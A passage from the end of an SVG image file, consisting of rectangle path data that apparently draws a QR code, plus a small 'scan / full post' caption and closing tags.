24.973h2.27v2.27h-2.27z M38.595 24.973h6.811v2.27h-6.811z M54.486 24.973h2.27v2.27h-2.27z M59.027 24.973h2.27v2.27h-2.27z M65.838 24.973h4.541v2.27h-4.541z M74.919 24.973h9.081v2.27h-9.081z M2.27 27.243h2.27v2.27h-2.27z M6.811 27.243h2.27v2.27h-2.27z M11.351 27.243h6.811v2.27h-6.811z M22.703 27.243h2.27v2.27h-2.27z M27.243 27.243h4.541v2.27h-4.541z M36.324 27.243h2.27v2.27h-2.27z M40.865 27.243h4.541v2.27h-4.541z M52.216 27.243h4.541v2.27h-4.541z M61.297 27.243h2.27v2.27h-2.27z M68.108 27.243h2.27v2.27h-2.27z M74.919 27.243h4.541v2.27h-4.541z M81.73 27.243h2.27v2.27h-2.27z M0.0 29.514h2.27v2.27h-2.27z M15.892 29.514h2.27v2.27h-2.27z M20.432 29.514h2.27v2.27h-2.27z M27.243 29.514h2.27v2.27h-2.27z M31.784 29.514h4.541v2.27h-4.541z M38.595 29.514h2.27v2.27h-2.27z M52.216 29.514h4.541v2.27h-4.541z M59.027 29.514h6.811v2.27h-6.811z M72.649 29.514h4.541v2.27h-4.541z M0.0 31.784h11.351v2.27h-11.351z M13.622 31.784h2.27v2.27h-2.27z M24.973 31.784h2.27v2.27h-2.27z M29.514 31.784h9.081v2.27h-9.081z M40.865 31.784h4.541v2.27h-4.541z M49.946 31.784h2.27v2.27h-2.27z M54.486 31.784h4.541v2.27h-4.541z M61.297 31.784h4.541v2.27h-4.541z M72.649 31.784h6.811v2.27h-6.811z M81.73 31.784h2.27v2.27h-2.27z M0.0 34.054h13.622v2.27h-13.622z M18.162 34.054h4.541v2.27h-4.541z M24.973 34.054h4.541v2.27h-4.541z M31.784 34.054h6.811v2.27h-6.811z M49.946 34.054h4.541v2.27h-4.541z M59.027 34.054h6.811v2.27h-6.811z M68.108 34.054h4.541v2.27h-4.541z M74.919 34.054h9.081v2.27h-9.081z M0.0 36.324h4.541v2.27h-4.541z M11.351 36.324h15.892v2.27h-15.892z M31.784 36.324h4.541v2.27h-4.541z M45.405 36.324h2.27v2.27h-2.27z M49.946 36.324h2.27v2.27h-2.27z M61.297 36.324h4.541v2.27h-4.541z M68.108 36.324h2.27v2.27h-2.27z M77.189 36.324h4.541v2.27h-4.541z M2.27 38.595h2.27v2.27h-2.27z M9.081 38.595h4.541v2.27h-4.541z M20.432 38.595h2.27v2.27h-2.27z M27.243 38.595h2.27v2.27h-2.27z M31.784 38.595h9.081v2.27h-9.081z M43.135 38.595h9.081v2.27h-9.081z M59.027 38.595h2.27v2.27h-2.27z M65.838 38.595h2.27v2.27h-2.27z M70.378 38.595h2.27v2.27h-2.27z M77.189 38.595h2.27v2.27h-2.27z M2.27 40.865h2.27v2.27h-2.27z M6.811 40.865h2.27v2.27h-2.27z M13.622 40.865h4.541v2.27h-4.541z M20.432 40.865h2.27v2.27h-2.27z M24.973 40.865h2.27v2.27h-2.27z M29.514 40.865h2.27v2.27h-2.27z M34.054 40.865h11.351v2.27h-11.351z M47.676 40.865h2.27v2.27h-2.27z M52.216 40.865h2.27v2.27h-2.27z M56.757 40.865h2.27v2.27h-2.27z M61.297 40.865h2.27v2.27h-2.27z M68.108 40.865h2.27v2.27h-2.27z M74.919 40.865h2.27v2.27h-2.27z M81.73 40.865h2.27v2.27h-2.27z M4.541 43.135h4.541v2.27h-4.541z M11.351 43.135h2.27v2.27h-2.27z M22.703 43.135h4.541v2.27h-4.541z M34.054 43.135h4.541v2.27h-4.541z M40.865 43.135h4.541v2.27h-4.541z M49.946 43.135h2.27v2.27h-2.27z M56.757 43.135h15.892v2.27h-15.892z M74.919 43.135h2.27v2.27h-2.27z M81.73 43.135h2.27v2.27h-2.27z M0.0 45.405h9.081v2.27h-9.081z M13.622 45.405h4.541v2.27h-4.541z M22.703 45.405h4.541v2.27h-4.541z M31.784 45.405h2.27v2.27h-2.27z M38.595 45.405h4.541v2.27h-4.541z M45.405 45.405h2.27v2.27h-2.27z M49.946 45.405h2.27v2.27h-2.27z M54.486 45.405h2.27v2.27h-2.27z M59.027 45.405h2.27v2.27h-2.27z M65.838 45.405h11.351v2.27h-11.351z M0.0 47.676h4.541v2.27h-4.541z M6.811 47.676h2.27v2.27h-2.27z M11.351 47.676h2.27v2.27h-2.27z M18.162 47.676h4.541v2.27h-4.541z M29.514 47.676h2.27v2.27h-2.27z M34.054 47.676h4.541v2.27h-4.541z M43.135 47.676h2.27v2.27h-2.27z M47.676 47.676h6.811v2.27h-6.811z M56.757 47.676h2.27v2.27h-2.27z M61.297 47.676h4.541v2.27h-4.541z M72.649 47.676h2.27v2.27h-2.27z M77.189 47.676h4.541v2.27h-4.541z M0.0 49.946h11.351v2.27h-11.351z M13.622 49.946h4.541v2.27h-4.541z M20.432 49.946h2.27v2.27h-2.27z M24.973 49.946h6.811v2.27h-6.811z M34.054 49.946h2.27v2.27h-2.27z M38.595 49.946h2.27v2.27h-2.27z M47.676 49.946h2.27v2.27h-2.27z M52.216 49.946h2.27v2.27h-2.27z M56.757 49.946h2.27v2.27h-2.27z M61.297 49.946h2.27v2.27h-2.27z M65.838 49.946h6.811v2.27h-6.811z M74.919 49.946h2.27v2.27h-2.27z M79.459 49.946h4.541v2.27h-4.541z M0.0 52.216h2.27v2.27h-2.27z M4.541 52.216h9.081v2.27h-9.081z M20.432 52.216h2.27v2.27h-2.27z M29.514 52.216h2.27v2.27h-2.27z M36.324 52.216h9.081v2.27h-9.081z M59.027 52.216h4.541v2.27h-4.541z M68.108 52.216h15.892v2.27h-15.892z M0.0 54.486h2.27v2.27h-2.27z M4.541 54.486h2.27v2.27h-2.27z M9.081 54.486h2.27v2.27h-2.27z M13.622 54.486h2.27v2.27h-2.27z M18.162 54.486h2.27v2.27h-2.27z M24.973 54.486h2.27v2.27h-2.27z M34.054 54.486h4.541v2.27h-4.541z M43.135 54.486h4.541v2.27h-4.541z M54.486 54.486h4.541v2.27h-4.541z M68.108 54.486h4.541v2.27h-4.541z M79.459 54.486h4.541v2.27h-4.541z M0.0 56.757h4.541v2.27h-4.541z M15.892 56.757h2.27v2.27h-2.27z M20.432 56.757h9.081v2.27h-9.081z M34.054 56.757h4.541v2.27h-4.541z M40.865 56.757h2.27v2.27h-2.27z M47.676 56.757h6.811v2.27h-6.811z M56.757 56.757h4.541v2.27h-4.541z M63.568 56.757h2.27v2.27h-2.27z M72.649 56.757h6.811v2.27h-6.811z M0.0 59.027h4.541v2.27h-4.541z M6.811 59.027h9.081v2.27h-9.081z M18.162 59.027h6.811v2.27h-6.811z M29.514 59.027h6.811v2.27h-6.811z M38.595 59.027h9.081v2.27h-9.081z M61.297 59.027h4.541v2.27h-4.541z M68.108 59.027h2.27v2.27h-2.27z M72.649 59.027h11.351v2.27h-11.351z M0.0 61.297h2.27v2.27h-2.27z M4.541 61.297h9.081v2.27h-9.081z M27.243 61.297h6.811v2.27h-6.811z M36.324 61.297h2.27v2.27h-2.27z M40.865 61.297h2.27v2.27h-2.27z M52.216 61.297h2.27v2.27h-2.27z M59.027 61.297h4.541v2.27h-4.541z M65.838 61.297h2.27v2.27h-2.27z M72.649 61.297h6.811v2.27h-6.811z M81.73 61.297h2.27v2.27h-2.27z M0.0 63.568h2.27v2.27h-2.27z M4.541 63.568h2.27v2.27h-2.27z M9.081 63.568h6.811v2.27h-6.811z M24.973 63.568h2.27v2.27h-2.27z M29.514 63.568h4.541v2.27h-4.541z M36.324 63.568h2.27v2.27h-2.27z M40.865 63.568h2.27v2.27h-2.27z M49.946 63.568h9.081v2.27h-9.081z M63.568 63.568h15.892v2.27h-15.892z M81.73 63.568h2.27v2.27h-2.27z M18.162 65.838h6.811v2.27h-6.811z M29.514 65.838h2.27v2.27h-2.27z M34.054 65.838h6.811v2.27h-6.811z M43.135 65.838h4.541v2.27h-4.541z M63.568 65.838h2.27v2.27h-2.27z M72.649 65.838h2.27v2.27h-2.27z M77.189 65.838h2.27v2.27h-2.27z M0.0 68.108h15.892v2.27h-15.892z M18.162 68.108h4.541v2.27h-4.541z M27.243 68.108h2.27v2.27h-2.27z M31.784 68.108h4.541v2.27h-4.541z M40.865 68.108h4.541v2.27h-4.541z M47.676 68.108h2.27v2.27h-2.27z M52.216 68.108h2.27v2.27h-2.27z M56.757 68.108h2.27v2.27h-2.27z M63.568 68.108h2.27v2.27h-2.27z M68.108 68.108h2.27v2.27h-2.27z M72.649 68.108h2.27v2.27h-2.27z M79.459 68.108h4.541v2.27h-4.541z M0.0 70.378h2.27v2.27h-2.27z M13.622 70.378h2.27v2.27h-2.27z M18.162 70.378h13.622v2.27h-13.622z M34.054 70.378h4.541v2.27h-4.541z M52.216 70.378h2.27v2.27h-2.27z M56.757 70.378h4.541v2.27h-4.541z M63.568 70.378h2.27v2.27h-2.27z M72.649 70.378h2.27v2.27h-2.27z M79.459 70.378h2.27v2.27h-2.27z M0.0 72.649h2.27v2.27h-2.27z M4.541 72.649h6.811v2.27h-6.811z M13.622 72.649h2.27v2.27h-2.27z M18.162 72.649h2.27v2.27h-2.27z M22.703 72.649h2.27v2.27h-2.27z M27.243 72.649h4.541v2.27h-4.541z M36.324 72.649h4.541v2.27h-4.541z M45.405 72.649h2.27v2.27h-2.27z M54.486 72.649h2.27v2.27h-2.27z M59.027 72.649h15.892v2.27h-15.892z M79.459 72.649h2.27v2.27h-2.27z M0.0 74.919h2.27v2.27h-2.27z M4.541 74.919h6.811v2.27h-6.811z M13.622 74.919h2.27v2.27h-2.27z M18.162 74.919h2.27v2.27h-2.27z M22.703 74.919h2.27v2.27h-2.27z M29.514 74.919h2.27v2.27h-2.27z M34.054 74.919h2.27v2.27h-2.27z M40.865 74.919h4.541v2.27h-4.541z M49.946 74.919h4.541v2.27h-4.541z M59.027 74.919h2.27v2.27h-2.27z M63.568 74.919h6.811v2.27h-6.811z M74.919 74.919h2.27v2.27h-2.27z M79.459 74.919h4.541v2.27h-4.541z M0.0 77.189h2.27v2.27h-2.27z M4.541 77.189h6.811v2.27h-6.811z M13.622 77.189h2.27v2.27h-2.27z M22.703 77.189h6.811v2.27h-6.811z M31.784 77.189h6.811v2.27h-6.811z M45.405 77.189h4.541v2.27h-4.541z M52.216 77.189h2.27v2.27h-2.27z M59.027 77.189h9.081v2.27h-9.081z M72.649 77.189h2.27v2.27h-2.27z M77.189 77.189h2.27v2.27h-2.27z M81.73 77.189h2.27v2.27h-2.27z M0.0 79.459h2.27v2.27h-2.27z M13.622 79.459h2.27v2.27h-2.27z M20.432 79.459h11.351v2.27h-11.351z M34.054 79.459h2.27v2.27h-2.27z M38.595 79.459h4.541v2.27h-4.541z M49.946 79.459h6.811v2.27h-6.811z M59.027 79.459h2.27v2.27h-2.27z M65.838 79.459h2.27v2.27h-2.27z M72.649 79.459h11.351v2.27h-11.351z M0.0 81.73h15.892v2.27h-15.892z M18.162 81.73h6.811v2.27h-6.811z M31.784 81.73h2.27v2.27h-2.27z M36.324 81.73h2.27v2.27h-2.27z M40.865 81.73h2.27v2.27h-2.27z M45.405 81.73h2.27v2.27h-2.27z M54.486 81.73h2.27v2.27h-2.27z M63.568 81.73h2.27v2.27h-2.27z M68.108 81.73h4.541v2.27h-4.541z M74.919 81.73h2.27v2.27h-2.27z M81.73 81.73h2.27v2.27h-2.27z"/>
</g>
<text x="1122" y="614" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="#F5F7FA" text-anchor="middle">scan / full post</text>
</svg>
